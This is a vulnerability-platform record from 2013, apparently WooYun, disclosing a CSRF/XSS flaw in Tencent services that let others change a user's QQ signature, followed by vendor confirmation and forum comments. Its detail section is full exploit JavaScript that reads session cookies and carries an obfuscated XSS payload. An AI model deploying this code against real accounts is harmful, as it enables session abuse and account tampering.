{"id": 10782, "wybug_id": "wooyun-2013-026966", "wybug_title": "任意修改别人QQ签名漏洞（已有人中招）", "wybug_corp": "腾讯", "wybug_author": "zzzmode", "wybug_date": "2013-06-26 16:59", "wybug_open_date": "2013-08-10 17:00", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-10：\t细节向公众公开  简要描述： 访问过腾讯的相关业务,然后浏览就可以修改别人的QQ签名了 详细说明：  \nfunction change_sign(){      var skey=document.cookie.match(/skey=(@\\w+)/)[1],         uin=parseInt(document.cookie.match(/uin=o(\\d+)/)[1],10);     new Image().src='http://data.soso.com/bingo/72/ChangeLn.php?uin='+uin+'&skey='+skey+'&ln=这里是签名内容';  } window.onload=function(){\tif(!window.ActiveXObject){\t\tdocument.domain=\"com\";\t\tvar iframe = document.createElement('iframe');                  iframe.style.display = 'none';\t\tiframe.onload = function(){          with(this.contentWindow){            eval('!'+change_sign+'()');          }\t\t};\t\tiframe.src = 'http://face.qq.com/ajax.proxy.html?domain=com';\t\tdocument.body.appendChild(iframe);\t}else{\t\tvar iframe = document.createElement('iframe');                iframe.style.display = 'none';\t\tiframe.src = 'http://game.wang.qq.com/game.html#?areaId=\"></object><script/defer>eval(String.fromCharCode(115,107,101,121,61,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,109,97,116,99,104,40,47,115,107,101,121,61,40,64,92,119,43,41,47,41,91,49,93,44,117,105,110,61,112,97,114,115,101,73,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,109,97,116,99,104,40,47,117,105,110,61,111,40,92,100,43,41,47,41,91,49,93,44,49,48,41,59,110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,39,104,116,116,112,58,47,47,100,97,116,97,46,115,111,115,111,46,99,111,109,47,98,105,110,103,111,47,55,50,47,67,104,97,110,103,101,76,110,46,112,104,112,63,117,105,110,61,39,43,117,105,110,43,39,38,115,107,101,121,61,39,43,115,107,101,121,43,39,38,108,110,61,37,69,55,37,56,56,37,66,49,37,69,55,37,57,70,37,65,53,37,69,52,37,66,57,37,56,69,37,69,70,37,66,67,37,56,67,37,69,55,37,56,56,37,66,49,80,75,65,86,37,69,70,37,66,67,37,56,49,39,59))<\\/script>';\t\tdocument.body.appendChild(iframe);\t}}\n   漏洞证明：  这个自己打开试试就知道了,前提是登录浏览过腾讯业务,测试很简单的\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 zzzmode@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-06-26 18:26 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-26 17:01 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  各种玩法已经浮现，求腾讯忽略。。。    \n     2013-06-26 17:01 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  我擦    \n     2013-06-26 17:01 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  把我们发在知乎的东西拿出来发到乌云？您老人家是有多无趣。没看到写着pkav么？    \n     2013-06-26 17:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @only_guest ......    \n     2013-06-26 17:04 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  据说某人中招了啊 (☆_☆)/~~    \n     2013-06-26 17:20 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  求忽略，速公开    \n     2013-06-26 17:24 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  可以么？    \n     2013-06-26 17:39 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  刚刚亲测了把，确实可以...    \n     2013-06-26 17:50 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  @only_guest 好思路，学到种新玩法...    \n     2013-06-26 17:51 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  霸气    \n     2013-06-26 17:53 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  @dyun 球细节    \n     2013-06-26 18:21 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:68        )\t\t \n  知乎上的东西。。。pkav的。。    \n     2013-06-26 18:29 |    \t\tvipons \t\t\t( 普通白帽子  |\t\t\t        Rank:284 漏洞数:65        | *^◎^*)\t\t \n  CCA    \n     2013-06-26 18:30 |    \t\tvipons \t\t\t( 普通白帽子  |\t\t\t        Rank:284 漏洞数:65        | *^◎^*)\t\t \n  @VIP 小盆友求乌云币买衣服    \n     2013-07-27 10:49 |    \t\tMelody \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 啊)\t\t \n  改马哥得,    \n     2013-08-17 03:06 |    \t\tredcar \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 找到组织了！)\t\t \n  我想弱弱的问一下这些漏洞是怎么挖出来的，难道仅仅是发现了没有token的隐患，然后一步一步构造攻击向量来利用的吗？    \n     2013-10-13 13:41 |    \t\tiveylowes \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        )\t\t \n  劫持女神去。哈哈哈哈  谢谢洞主了！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}